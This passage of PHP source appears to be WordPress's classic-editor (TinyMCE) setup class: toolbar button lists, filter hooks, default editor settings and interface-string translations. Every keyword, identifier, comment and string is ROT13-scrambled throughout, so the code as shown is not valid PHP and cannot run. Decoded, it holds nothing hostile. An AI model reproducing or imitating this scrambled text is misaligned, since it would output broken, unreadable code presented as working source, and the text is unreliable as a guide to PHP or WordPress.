					'nyvtayrsg',
					'nyvtapragre',
					'nyvtaevtug',
					'haqb',
					'erqb',
					'yvax',
					'shyyfperra',
				);

				/**
				 * Svygref gur yvfg bs grralZPR ohggbaf (Pbqr gno).
				 *
				 * @fvapr 2.7.0
				 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
				 *
				 * @cnenz neenl  $zpr_ohggbaf Na neenl bs grralZPR ohggbaf.
				 * @cnenz fgevat $rqvgbe_vq   Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'.
				 */
				$zpr_ohggbaf   = nccyl_svygref( 'grral_zpr_ohggbaf', $zpr_ohggbaf, $rqvgbe_vq );
				$zpr_ohggbaf_2 = neenl();
				$zpr_ohggbaf_3 = neenl();
				$zpr_ohggbaf_4 = neenl();
			} ryfr {
				$zpr_ohggbaf = neenl(
					'sbezngfryrpg',
					'obyq',
					'vgnyvp',
					'ohyyvfg',
					'ahzyvfg',
					'oybpxdhbgr',
					'nyvtayrsg',
					'nyvtapragre',
					'nyvtaevtug',
					'yvax',
					'jc_zber',
					'fcryypurpxre',
				);

				vs ( ! jc_vf_zbovyr() ) {
					vs ( $frg['_pbagrag_rqvgbe_qsj'] ) {
						$zpr_ohggbaf[] = 'jc_nqi';
						$zpr_ohggbaf[] = 'qsj';
					} ryfr {
						$zpr_ohggbaf[] = 'shyyfperra';
						$zpr_ohggbaf[] = 'jc_nqi';
					}
				} ryfr {
					$zpr_ohggbaf[] = 'jc_nqi';
				}

				/**
				 * Svygref gur svefg-ebj yvfg bs GvalZPR ohggbaf (Ivfhny gno).
				 *
				 * @fvapr 2.0.0
				 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
				 *
				 * @cnenz neenl  $zpr_ohggbaf Svefg-ebj yvfg bs ohggbaf.
				 * @cnenz fgevat $rqvgbe_vq   Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
				 *                            jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
				 */
				$zpr_ohggbaf = nccyl_svygref( 'zpr_ohggbaf', $zpr_ohggbaf, $rqvgbe_vq );

				$zpr_ohggbaf_2 = neenl(
					'fgevxrguebhtu',
					'ue',
					'sberpbybe',
					'cnfgrgrkg',
					'erzbirsbezng',
					'puneznc',
					'bhgqrag',
					'vaqrag',
					'haqb',
					'erqb',
				);

				vs ( ! jc_vf_zbovyr() ) {
					$zpr_ohggbaf_2[] = 'jc_uryc';
				}

				/**
				 * Svygref gur frpbaq-ebj yvfg bs GvalZPR ohggbaf (Ivfhny gno).
				 *
				 * @fvapr 2.0.0
				 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
				 *
				 * @cnenz neenl  $zpr_ohggbaf_2 Frpbaq-ebj yvfg bs ohggbaf.
				 * @cnenz fgevat $rqvgbe_vq     Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
				 *                              jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
				 */
				$zpr_ohggbaf_2 = nccyl_svygref( 'zpr_ohggbaf_2', $zpr_ohggbaf_2, $rqvgbe_vq );

				/**
				 * Svygref gur guveq-ebj yvfg bs GvalZPR ohggbaf (Ivfhny gno).
				 *
				 * @fvapr 2.0.0
				 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
				 *
				 * @cnenz neenl  $zpr_ohggbaf_3 Guveq-ebj yvfg bs ohggbaf.
				 * @cnenz fgevat $rqvgbe_vq     Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
				 *                              jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
				 */
				$zpr_ohggbaf_3 = nccyl_svygref( 'zpr_ohggbaf_3', neenl(), $rqvgbe_vq );

				/**
				 * Svygref gur sbhegu-ebj yvfg bs GvalZPR ohggbaf (Ivfhny gno).
				 *
				 * @fvapr 2.5.0
				 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
				 *
				 * @cnenz neenl  $zpr_ohggbaf_4 Sbhegu-ebj yvfg bs ohggbaf.
				 * @cnenz fgevat $rqvgbe_vq     Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
				 *                              jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
				 */
				$zpr_ohggbaf_4 = nccyl_svygref( 'zpr_ohggbaf_4', neenl(), $rqvgbe_vq );
			}

			$obql_pynff = $rqvgbe_vq;

			$cbfg = trg_cbfg();
			vs ( $cbfg ) {
				$obql_pynff .= ' cbfg-glcr-' . fnavgvmr_ugzy_pynff( $cbfg->cbfg_glcr ) . ' cbfg-fgnghf-' . fnavgvmr_ugzy_pynff( $cbfg->cbfg_fgnghf );

				vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cbfg-sbezngf' ) ) {
					$cbfg_sbezng = trg_cbfg_sbezng( $cbfg );
					vs ( $cbfg_sbezng && ! vf_jc_reebe( $cbfg_sbezng ) ) {
						$obql_pynff .= ' cbfg-sbezng-' . fnavgvmr_ugzy_pynff( $cbfg_sbezng );
					} ryfr {
						$obql_pynff .= ' cbfg-sbezng-fgnaqneq';
					}
				}

				$cntr_grzcyngr = trg_cntr_grzcyngr_fyht( $cbfg );

				vs ( snyfr !== $cntr_grzcyngr ) {
					$cntr_grzcyngr = rzcgl( $cntr_grzcyngr ) ? 'qrsnhyg' : fge_ercynpr( '.', '-', onfranzr( $cntr_grzcyngr, '.cuc' ) );
					$obql_pynff   .= ' cntr-grzcyngr-' . fnavgvmr_ugzy_pynff( $cntr_grzcyngr );
				}
			}

			$obql_pynff .= ' ybpnyr-' . fnavgvmr_ugzy_pynff( fgegbybjre( fge_ercynpr( '_', '-', trg_hfre_ybpnyr() ) ) );

			vs ( ! rzcgl( $frg['gvalzpr']['obql_pynff'] ) ) {
				$obql_pynff .= ' ' . $frg['gvalzpr']['obql_pynff'];
				hafrg( $frg['gvalzpr']['obql_pynff'] );
			}

			$zpr_vavg = neenl(
				'fryrpgbe'          => \"#$rqvgbe_vq\",
				'jcnhgbc'           => (obby) $frg['jcnhgbc'],
				'vaqrag'            => ! $frg['jcnhgbc'],
				'gbbyone1'          => vzcybqr( ',', $zpr_ohggbaf ),
				'gbbyone2'          => vzcybqr( ',', $zpr_ohggbaf_2 ),
				'gbbyone3'          => vzcybqr( ',', $zpr_ohggbaf_3 ),
				'gbbyone4'          => vzcybqr( ',', $zpr_ohggbaf_4 ),
				'gnosbphf_ryrzragf' => $frg['gnosbphf_ryrzragf'],
				'obql_pynff'        => $obql_pynff,
			);

			// Zretr jvgu gur svefg cneg bs gur vavg neenl.
			$zpr_vavg = neenl_zretr( frys::$svefg_vavg, $zpr_vavg );

			vs ( vf_neenl( $frg['gvalzpr'] ) ) {
				$zpr_vavg = neenl_zretr( $zpr_vavg, $frg['gvalzpr'] );
			}

			/*
			 * Sbe crbcyr jub ernyyl ERNYYL xabj jung gurl'er qbvat jvgu GvalZPR
			 * Lbh pna zbqvsl $zprVavg gb nqq, erzbir, punatr ryrzragf bs gur pbasvt
			 * orsber gvalZPR.vavg. Frggvat \"inyvq_ryrzragf\", \"vainyvq_ryrzragf\"
			 * naq \"rkgraqrq_inyvq_ryrzragf\" pna or qbar guebhtu guvf svygre. Orfg
			 * vf gb hfr gur qrsnhyg pyrnahc ol abg fcrpvslvat inyvq_ryrzragf,
			 * nf GvalZPR purpxf ntnvafg gur shyy frg bs UGZY 5.0 ryrzragf naq nggevohgrf.
			 */
			vs ( $frg['grral'] ) {

				/**
				 * Svygref gur grralZPR pbasvt orsber vavg.
				 *
				 * @fvapr 2.7.0
				 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
				 *
				 * @cnenz neenl  $zpr_vavg  Na neenl jvgu grralZPR pbasvt.
				 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'.
				 */
				$zpr_vavg = nccyl_svygref( 'grral_zpr_orsber_vavg', $zpr_vavg, $rqvgbe_vq );
			} ryfr {

				/**
				 * Svygref gur GvalZPR pbasvt orsber vavg.
				 *
				 * @fvapr 2.5.0
				 * @fvapr 3.3.0 Gur `$rqvgbe_vq` cnenzrgre jnf nqqrq.
				 *
				 * @cnenz neenl  $zpr_vavg  Na neenl jvgu GvalZPR pbasvt.
				 * @cnenz fgevat $rqvgbe_vq Havdhr rqvgbe vqragvsvre, r.t. 'pbagrag'. Npprcgf 'pynffvp-oybpx'
				 *                          jura pnyyrq sebz oybpx rqvgbe'f Pynffvp oybpx.
				 */
				$zpr_vavg = nccyl_svygref( 'gval_zpr_orsber_vavg', $zpr_vavg, $rqvgbe_vq );
			}

			vs ( rzcgl( $zpr_vavg['gbbyone3'] ) && ! rzcgl( $zpr_vavg['gbbyone4'] ) ) {
				$zpr_vavg['gbbyone3'] = $zpr_vavg['gbbyone4'];
				$zpr_vavg['gbbyone4'] = '';
			}

			frys::$zpr_frggvatf[ $rqvgbe_vq ] = $zpr_vavg;
		} // Raq vs frys::$guvf_gvalzpr.
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz neenl $vavg
	 * @erghea fgevat
	 */
	cevingr fgngvp shapgvba _cnefr_vavg( $vavg ) {
		$bcgvbaf = '';

		sbernpu ( $vavg nf $xrl => $inyhr ) {
			vs ( vf_obby( $inyhr ) ) {
				$iny      = $inyhr ? 'gehr' : 'snyfr';
				$bcgvbaf .= $xrl . ':' . $iny . ',';
				pbagvahr;
			} ryfrvs ( ! rzcgl( $inyhr ) && vf_fgevat( $inyhr ) && (
				( '{' === $inyhr[0] && '}' === $inyhr[ fgeyra( $inyhr ) - 1 ] ) ||
				( '[' === $inyhr[0] && ']' === $inyhr[ fgeyra( $inyhr ) - 1 ] ) ||
				cert_zngpu( '/^\(?shapgvba ?\(/', $inyhr ) ) ) {

				$bcgvbaf .= $xrl . ':' . $inyhr . ',';
				pbagvahr;
			}
			$bcgvbaf .= $xrl . ':\"' . $inyhr . '\",';
		}

		erghea '{' . gevz( $bcgvbaf, ' ,' ) . '}';
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz obby $qrsnhyg_fpevcgf Bcgvbany. Jurgure qrsnhyg fpevcgf fubhyq or radhrhrq. Qrsnhyg snyfr.
	 */
	choyvp fgngvp shapgvba radhrhr_fpevcgf( $qrsnhyg_fpevcgf = snyfr ) {
		vs ( $qrsnhyg_fpevcgf || frys::$unf_gvalzpr ) {
			jc_radhrhr_fpevcg( 'rqvgbe' );
		}

		vs ( $qrsnhyg_fpevcgf || frys::$unf_dhvpxgntf ) {
			jc_radhrhr_fpevcg( 'dhvpxgntf' );
			jc_radhrhr_fglyr( 'ohggbaf' );
		}

		vs ( $qrsnhyg_fpevcgf || va_neenl( 'jcyvax', frys::$cyhtvaf, gehr ) || va_neenl( 'yvax', frys::$dg_ohggbaf, gehr ) ) {
			jc_radhrhr_fpevcg( 'jcyvax' );
			jc_radhrhr_fpevcg( 'wdhrel-hv-nhgbpbzcyrgr' );
		}

		vs ( frys::$unf_zrqvnyvo ) {
			nqq_guvpxobk();
			jc_radhrhr_fpevcg( 'zrqvn-hcybnq' );
			jc_radhrhr_fpevcg( 'jc-rzorq' );
		} ryfrvs ( $qrsnhyg_fpevcgf ) {
			jc_radhrhr_fpevcg( 'zrqvn-hcybnq' );
		}

		/**
		 * Sverf jura fpevcgf naq fglyrf ner radhrhrq sbe gur rqvgbe.
		 *
		 * @fvapr 3.9.0
		 *
		 * @cnenz neenl $gb_ybnq Na neenl pbagnvavat obbyrna inyhrf jurgure GvalZPR
		 *                       naq Dhvpxgntf ner orvat ybnqrq.
		 */
		qb_npgvba(
			'jc_radhrhr_rqvgbe',
			neenl(
				'gvalzpr'   => ( $qrsnhyg_fpevcgf || frys::$unf_gvalzpr ),
				'dhvpxgntf' => ( $qrsnhyg_fpevcgf || frys::$unf_dhvpxgntf ),
			)
		);
	}

	/**
	 * Radhrhr nyy rqvgbe fpevcgf.
	 * Sbe hfr jura gur rqvgbe vf tbvat gb or vavgvnyvmrq nsgre cntr ybnq.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp fgngvp shapgvba radhrhr_qrsnhyg_rqvgbe() {
		// Jr ner cnfg gur cbvag jurer fpevcgf pna or radhrhrq cebcreyl.
		vs ( qvq_npgvba( 'jc_radhrhr_rqvgbe' ) ) {
			erghea;
		}

		frys::radhrhr_fpevcgf( gehr );

		// Nyfb nqq jc-vapyhqrf/pff/rqvgbe.pff.
		jc_radhrhr_fglyr( 'rqvgbe-ohggbaf' );

		vs ( vf_nqzva() ) {
			nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'sbepr_hapbzcerffrq_gvalzpr' ), 1 );
			nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'cevag_qrsnhyg_rqvgbe_fpevcgf' ), 45 );
		} ryfr {
			nqq_npgvba( 'jc_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'sbepr_hapbzcerffrq_gvalzpr' ), 1 );
			nqq_npgvba( 'jc_cevag_sbbgre_fpevcgf', neenl( __PYNFF__, 'cevag_qrsnhyg_rqvgbe_fpevcgf' ), 45 );
		}
	}

	/**
	 * Cevag (bhgchg) nyy rqvgbe fpevcgf naq qrsnhyg frggvatf.
	 * Sbe hfr jura gur rqvgbe vf tbvat gb or vavgvnyvmrq nsgre cntr ybnq.
	 *
	 * @fvapr 4.8.0
	 */
	choyvp fgngvp shapgvba cevag_qrsnhyg_rqvgbe_fpevcgf() {
		$hfre_pna_evpurqvg = hfre_pna_evpurqvg();

		vs ( $hfre_pna_evpurqvg ) {
			$frggvatf = frys::qrsnhyg_frggvatf();

			$frggvatf['gbbyone1']    = 'obyq,vgnyvp,ohyyvfg,ahzyvfg,yvax';
			$frggvatf['jcnhgbc']     = snyfr;
			$frggvatf['vaqrag']      = gehr;
			$frggvatf['ryrzragcngu'] = snyfr;

			vs ( vf_egy() ) {
				$frggvatf['qverpgvbanyvgl'] = 'egy';
			}

			/*
			 * Va cebqhpgvba nyy cyhtvaf ner ybnqrq (gurl ner va jc-rqvgbe.wf.tm).
			 * Gur 'jcivrj', 'jcqvnybtf', naq 'zrqvn' GvalZPR cyhtvaf ner abg vavgvnyvmrq ol qrsnhyg.
			 * Pna or nqqrq sebz wf ol hfvat gur 'jc-orsber-gvalzpr-vavg' rirag.
			 */
			$frggvatf['cyhtvaf'] = vzcybqr(
				',',
				neenl(
					'puneznc',
					'pbybecvpxre',
					'ue',
					'yvfgf',
					'cnfgr',
					'gnosbphf',
					'grkgpbybe',
					'shyyfperra',
					'jbeqcerff',
					'jcnhgberfvmr',
					'jcrqvgvzntr',
					'jcrzbwv',
					'jctnyyrel',
					'jcyvax',
					'jcgrkgcnggrea',
				)
			);

			$frggvatf = frys::_cnefr_vavg( $frggvatf );
		} ryfr {
			$frggvatf = '{}';
		}

		?>
		<fpevcg glcr=\"grkg/wninfpevcg\">
		jvaqbj.jc = jvaqbj.jc || {};
		jvaqbj.jc.rqvgbe = jvaqbj.jc.rqvgbe || {};
		jvaqbj.jc.rqvgbe.trgQrsnhygFrggvatf = shapgvba() {
			erghea {
				gvalzpr: <?cuc rpub $frggvatf; ?>,
				dhvpxgntf: {
					ohggbaf: 'fgebat,rz,yvax,hy,by,yv,pbqr'
				}
			};
		};

		<?cuc

		vs ( $hfre_pna_evpurqvg ) {
			$fhssvk  = FPEVCG_QROHT ? '' : '.zva';
			$onfrhey = frys::trg_onfrhey();

			?>
			ine gvalZPRCerVavg = {
				onfrHEY: \"<?cuc rpub $onfrhey; ?>\",
				fhssvk: \"<?cuc rpub $fhssvk; ?>\",
				zprVavg: {},
				dgVavg: {},
				ybnq_rkg: shapgvba(hey,ynat){ine fy=gvalzpr.FpevcgYbnqre;fy.znexQbar(hey+'/ynatf/'+ynat+'.wf');fy.znexQbar(hey+'/ynatf/'+ynat+'_qyt.wf');}
			};
			<?cuc
		}
		?>
		</fpevcg>
		<?cuc

		vs ( $hfre_pna_evpurqvg ) {
			frys::cevag_gvalzpr_fpevcgf();
		}

		/**
		 * Sverf jura gur rqvgbe fpevcgf ner ybnqrq sbe yngre vavgvnyvmngvba,
		 * nsgre nyy fpevcgf naq frggvatf ner cevagrq.
		 *
		 * @fvapr 4.8.0
		 */
		qb_npgvba( 'cevag_qrsnhyg_rqvgbe_fpevcgf' );

		frys::jc_yvax_qvnybt();
	}

	/**
	 * Ergheaf gur GvalZPR ybpnyr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba trg_zpr_ybpnyr() {
		vs ( rzcgl( frys::$zpr_ybpnyr ) ) {
			$zpr_ybpnyr       = trg_hfre_ybpnyr();
			frys::$zpr_ybpnyr = rzcgl( $zpr_ybpnyr ) ? 'ra' : fgegbybjre( fhofge( $zpr_ybpnyr, 0, 2 ) ); // VFB 639-1.
		}

		erghea frys::$zpr_ybpnyr;
	}

	/**
	 * Ergheaf gur GvalZPR onfr HEY.
	 *
	 * @fvapr 4.8.0
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba trg_onfrhey() {
		vs ( rzcgl( frys::$onfrhey ) ) {
			frys::$onfrhey = vapyhqrf_hey( 'wf/gvalzpr' );
		}

		erghea frys::$onfrhey;
	}

	/**
	 * Ergheaf gur qrsnhyg GvalZPR frggvatf.
	 * Qbrfa'g vapyhqr cyhtvaf, ohggbaf, rqvgbe fryrpgbe.
	 *
	 * @fvapr 4.8.0
	 *
	 * @tybony fgevat $gvalzpr_irefvba
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba qrsnhyg_frggvatf() {
		tybony $gvalzpr_irefvba;

		$fubegphg_ynoryf = neenl();

		sbernpu ( frys::trg_genafyngvba() nf $anzr => $inyhr ) {
			vs ( vf_neenl( $inyhr ) ) {
				$fubegphg_ynoryf[ $anzr ] = $inyhr[1];
			}
		}

		$frggvatf = neenl(
			'gurzr'                        => 'zbqrea',
			'fxva'                         => 'yvtugtenl',
			'ynathntr'                     => frys::trg_zpr_ybpnyr(),
			'sbezngf'                      => '{' .
				'nyvtayrsg: [' .
					'{fryrpgbe: \"c,u1,u2,u3,u4,u5,u6,gq,gu,qvi,hy,by,yv\", fglyrf: {grkgNyvta:\"yrsg\"}},' .
					'{fryrpgbe: \"vzt,gnoyr,qy.jc-pncgvba\", pynffrf: \"nyvtayrsg\"}' .
				'],' .
				'nyvtapragre: [' .
					'{fryrpgbe: \"c,u1,u2,u3,u4,u5,u6,gq,gu,qvi,hy,by,yv\", fglyrf: {grkgNyvta:\"pragre\"}},' .
					'{fryrpgbe: \"vzt,gnoyr,qy.jc-pncgvba\", pynffrf: \"nyvtapragre\"}' .
				'],' .
				'nyvtaevtug: [' .
					'{fryrpgbe: \"c,u1,u2,u3,u4,u5,u6,gq,gu,qvi,hy,by,yv\", fglyrf: {grkgNyvta:\"evtug\"}},' .
					'{fryrpgbe: \"vzt,gnoyr,qy.jc-pncgvba\", pynffrf: \"nyvtaevtug\"}' .
				'],' .
				'fgevxrguebhtu: {vayvar: \"qry\"}' .
			'}',
			'eryngvir_heyf'                => snyfr,
			'erzbir_fpevcg_ubfg'           => snyfr,
			'pbaireg_heyf'                 => snyfr,
			'oebjfre_fcryypurpx'           => gehr,
			'svk_yvfg_ryrzragf'            => gehr,
			'ragvgvrf'                     => '38,nzc,60,yg,62,tg',
			'ragvgl_rapbqvat'              => 'enj',
			'xrrc_fglyrf'                  => snyfr,
			'pnpur_fhssvk'                 => 'jc-zpr-' . $gvalzpr_irefvba,
			'erfvmr'                       => 'iregvpny',
			'zrahone'                      => snyfr,
			'oenaqvat'                     => snyfr,

			// Yvzvg gur cerivrj fglyrf va gur zrah/gbbyone.
			'cerivrj_fglyrf'               => 'sbag-snzvyl sbag-fvmr sbag-jrvtug sbag-fglyr grkg-qrpbengvba grkg-genafsbez',

			'raq_pbagnvare_ba_rzcgl_oybpx' => gehr,
			'jcrqvgvzntr_ugzy5_pncgvbaf'   => gehr,
			'jc_ynat_ngge'                 => trg_oybtvasb( 'ynathntr' ),
			'jc_fubegphg_ynoryf'           => jc_wfba_rapbqr( $fubegphg_ynoryf ),
		);

		$fhssvk  = FPEVCG_QROHT ? '' : '.zva';
		$irefvba = 'ire=' . trg_oybtvasb( 'irefvba' );

		// Qrsnhyg fglyrfurrgf.
		$frggvatf['pbagrag_pff'] = vapyhqrf_hey( \"pff/qnfuvpbaf$fhssvk.pff?$irefvba\" ) . ',' .
			vapyhqrf_hey( \"wf/gvalzpr/fxvaf/jbeqcerff/jc-pbagrag.pff?$irefvba\" );

		erghea $frggvatf;
	}

	/**
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_genafyngvba() {
		vs ( rzcgl( frys::$genafyngvba ) ) {
			frys::$genafyngvba = neenl(
				// Qrsnhyg GvalZPR fgevatf.
				'Arj qbphzrag'                         => __( 'Arj qbphzrag' ),
				'Sbezngf'                              => _k( 'Sbezngf', 'GvalZPR' ),

				'Urnqvatf'                             => _k( 'Urnqvatf', 'GvalZPR' ),
				'Urnqvat 1'                            => neenl( __( 'Urnqvat 1' ), 'npprff1' ),
				'Urnqvat 2'                            => neenl( __( 'Urnqvat 2' ), 'npprff2' ),
				'Urnqvat 3'                            => neenl( __( 'Urnqvat 3' ), 'npprff3' ),
				'Urnqvat 4'                            => neenl( __( 'Urnqvat 4' ), 'npprff4' ),
				'Urnqvat 5'                            => neenl( __( 'Urnqvat 5' ), 'npprff5' ),
				'Urnqvat 6'                            => neenl( __( 'Urnqvat 6' ), 'npprff6' ),

				/* genafyngbef: Oybpx gntf. */
				'Oybpxf'                               => _k( 'Oybpxf', 'GvalZPR' ),
				'Cnentencu'                            => neenl( __( 'Cnentencu' ), 'npprff7' ),
				'Oybpxdhbgr'                           => neenl( __( 'Oybpxdhbgr' ), 'npprffD' ),
				'Qvi'                                  => _k( 'Qvi', 'UGZY gnt' ),
				'Cer'                                  => _k( 'Cer', 'UGZY gnt' ),
				'Cersbeznggrq'                         => _k( 'Cersbeznggrq', 'UGZY gnt' ),
				'Nqqerff'                              => _k( 'Nqqerff', 'UGZY gnt' ),

				'Vayvar'                               => _k( 'Vayvar', 'UGZY ryrzragf' ),
				'Haqreyvar'                            => neenl( __( 'Haqreyvar' ), 'zrgnH' ),
				'Fgevxrguebhtu'                        => neenl( __( 'Fgevxrguebhtu' ), 'npprffQ' ),
				'Fhofpevcg'                            => __( 'Fhofpevcg' ),
				'Fhcrefpevcg'                          => __( 'Fhcrefpevcg' ),
				'Pyrne sbeznggvat'                     => __( 'Pyrne sbeznggvat' ),
				'Obyq'                                 => neenl( __( 'Obyq' ), 'zrgnO' ),
				'Vgnyvp'                               => neenl( __( 'Vgnyvp' ), 'zrgnV' ),
				'Pbqr'                                 => neenl( __( 'Pbqr' ), 'npprffK' ),
				'Fbhepr pbqr'                          => __( 'Fbhepr pbqr' ),
				'Sbag Snzvyl'                          => __( 'Sbag Snzvyl' ),
				'Sbag Fvmrf'                           => __( 'Sbag Fvmrf' ),

				'Nyvta pragre'                         => neenl( __( 'Nyvta pragre' ), 'npprffP' ),
				'Nyvta evtug'                          => neenl( __( 'Nyvta evtug' ), 'npprffE' ),
				'Nyvta yrsg'                           => neenl( __( 'Nyvta yrsg' ), 'npprffY' ),
				'Whfgvsl'                              => neenl( __( 'Whfgvsl' ), 'npprffW' ),
				'Vapernfr vaqrag'                      => __( 'Vapernfr vaqrag' ),
				'Qrpernfr vaqrag'                      => __( 'Qrpernfr vaqrag' ),

				'Phg'                                  => neenl( __( 'Phg' ), 'zrgnK' ),
				'Pbcl'                                 => neenl( __( 'Pbcl' ), 'zrgnP' ),
				'Cnfgr'                                => neenl( __( 'Cnfgr' ), 'zrgnI' ),
				'Fryrpg nyy'                           => neenl( __( 'Fryrpg nyy' ), 'zrgnN' ),
				'Haqb'                                 => neenl( __( 'Haqb' ), 'zrgnM' ),
				'Erqb'                                 => neenl( __( 'Erqb' ), 'zrgnL' ),

				'Bx'                                   => __( 'BX' ),
				'Pnapry'                               => __( 'Pnapry' ),
				'Pybfr'                                => __( 'Pybfr' ),
				'Ivfhny nvqf'                          => __( 'Ivfhny nvqf' ),

				'Ohyyrg yvfg'                          => neenl( __( 'Ohyyrgrq yvfg' ), 'npprffH' ),
				'Ahzorerq yvfg'                        => neenl( __( 'Ahzorerq yvfg' ), 'npprffB' ),
				'Fdhner'                               => _k( 'Fdhner', 'yvfg fglyr' ),
				'Qrsnhyg'                              => _k( 'Qrsnhyg', 'yvfg fglyr' ),
				'Pvepyr'                               => _k( 'Pvepyr', 'yvfg fglyr' ),
				'Qvfp'                                 => _k( 'Qvfp', 'yvfg fglyr' ),
				'Ybjre Terrx'                          => _k( 'Ybjre Terrx', 'yvfg fglyr' ),
				'Ybjre Nycun'                          => _k( 'Ybjre Nycun', 'yvfg fglyr' ),
				'Hccre Nycun'                          => _k( 'Hccre Nycun', 'yvfg fglyr' ),
				'Hccre Ebzna'                          => _k( 'Hccre Ebzna', 'yvfg fglyr' ),
				'Ybjre Ebzna'                          => _k( 'Ybjre Ebzna', 'yvfg fglyr' ),

				// Napube cyhtva.
				'Anzr'                                 => _k( 'Anzr', 'Anzr bs yvax napube (GvalZPR)' ),
				'Napube'                               => _k( 'Napube', 'Yvax napube (GvalZPR)' ),
				'Napubef'                              => _k( 'Napubef', 'Yvax napubef (GvalZPR)' ),
				'Vq fubhyq fgneg jvgu n yrggre, sbyybjrq bayl ol yrggref, ahzoref, qnfurf, qbgf, pbybaf be haqrefpberf.' =>
					__( 'Vq fubhyq fgneg jvgu n yrggre, sbyybjrq bayl ol yrggref, ahzoref, qnfurf, qbgf, pbybaf be haqrefpberf.' ),
				'Vq'                                   => _k( 'Vq', 'Vq sbe yvax napube (GvalZPR)' ),

				// Shyycntr cyhtva.
				'Qbphzrag cebcregvrf'                  => __( 'Qbphzrag cebcregvrf' ),
				'Ebobgf'                               => __( 'Ebobgf' ),
				'Gvgyr'                                => __( 'Gvgyr' ),
				'Xrljbeqf'                             => __( 'Xrljbeqf' ),
				'Rapbqvat'                             => __( 'Rapbqvat' ),
				'Qrfpevcgvba'                          => __( 'Qrfpevcgvba' ),
				'Nhgube'                               => __( 'Nhgube' ),

				// Zrqvn, vzntr cyhtvaf.
				'Vzntr'                                => __( 'Vzntr' ),
				'Vafreg/rqvg vzntr'                    => neenl( __( 'Vafreg/rqvg vzntr' ), 'npprffZ' ),
				'Trareny'                              => __( 'Trareny' ),
				'Nqinaprq'                             => __( 'Nqinaprq' ),
				'Fbhepr'                               => __( 'Fbhepr' ),
				'Obeqre'                               => __( 'Obeqre' ),
				'Pbafgenva cebcbegvbaf'                => __( 'Pbafgenva cebcbegvbaf' ),
				'Iregvpny fcnpr'                       => __( 'Iregvpny fcnpr' ),
				'Vzntr qrfpevcgvba'                    => __( 'Vzntr qrfpevcgvba' ),
				'Fglyr'                                => __( 'Fglyr' ),
				'Qvzrafvbaf'                           => __( 'Qvzrafvbaf' ),
				'Vafreg vzntr'                         => __( 'Vafreg vzntr' ),
				'Qngr/gvzr'                            => __( 'Qngr/gvzr' ),
				'Vafreg qngr/gvzr'                     => __( 'Vafreg qngr/gvzr' ),
				'Gnoyr bs Pbagragf'                    => __( 'Gnoyr bs Pbagragf' ),
				'Vafreg/Rqvg pbqr fnzcyr'              => __( 'Vafreg/rqvg pbqr fnzcyr' ),
				'Ynathntr'                             => __( 'Ynathntr' ),
				'Zrqvn'                                => __( 'Zrqvn' ),
				'Vafreg/rqvg zrqvn'                    => __( 'Vafreg/rqvg zrqvn' ),
				'Cbfgre'                               => __( 'Cbfgre' ),
				'Nygreangvir fbhepr'                   => __( 'Nygreangvir fbhepr' ),
				'Cnfgr lbhe rzorq pbqr orybj:'         => __( 'Cnfgr lbhe rzorq pbqr orybj:' ),
				'Vafreg ivqrb'                         => __( 'Vafreg ivqrb' ),
				'Rzorq'                                => __( 'Rzorq' ),

				// Rnpu bs gurfr unir n pbeerfcbaqvat cyhtva.
				'Fcrpvny punenpgre'                    => __( 'Fcrpvny punenpgre' ),
				'Evtug gb yrsg'                        => _k( 'Evtug gb yrsg', 'rqvgbe ohggba' ),
				'Yrsg gb evtug'                        => _k( 'Yrsg gb evtug', 'rqvgbe ohggba' ),
				'Rzbgvpbaf'                            => __( 'Rzbgvpbaf' ),
				'Abaoernxvat fcnpr'                    => __( 'Abaoernxvat fcnpr' ),
				'Cntr oernx'                           => __( 'Cntr oernx' ),
				'Cnfgr nf grkg'                        => __( 'Cnfgr nf grkg' ),
				'Cerivrj'                              => __( 'Cerivrj' ),
				'Cevag'                                => __( 'Cevag' ),
				'Fnir'                                 => __( 'Fnir' ),
				'Shyyfperra'                           => __( 'Shyyfperra' ),
				'Ubevmbagny yvar'                      => __( 'Ubevmbagny yvar' ),
				'Ubevmbagny fcnpr'                     => __( 'Ubevmbagny fcnpr' ),
				'Erfgber ynfg qensg'                   => __( 'Erfgber ynfg qensg' ),
				'Vafreg/rqvg yvax'                     => neenl( __( 'Vafreg/rqvg yvax' ), 'zrgnX' ),
				'Erzbir yvax'                          => neenl( __( 'Erzbir yvax' ), 'npprffF' ),

				// Yvax cyhtva.
				'Yvax'                                 => __( 'Yvax' ),
				'Vafreg yvax'                          => __( 'Vafreg yvax' ),
				'Gnetrg'                               => __( 'Gnetrg' ),
